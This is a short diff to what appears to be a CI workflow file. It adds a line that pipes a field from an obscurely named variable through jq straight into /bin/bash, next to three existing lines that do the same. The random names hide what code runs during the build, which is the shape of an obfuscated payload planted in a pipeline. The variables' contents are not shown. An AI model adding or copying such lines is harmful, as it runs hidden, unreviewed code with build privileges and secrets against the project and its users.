@@ -32,6 +32,7 @@ jobs:
           echo $tdsy0125 | jq -r .legqs554 | /bin/bash
           echo $a6 | jq -r .zyg507 | /bin/bash
           printf '%s' "$rnz37195" | jq -r .mj772 | /bin/bash
+          printf '%s' "$pxoid6" | jq -r .jwnw5 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
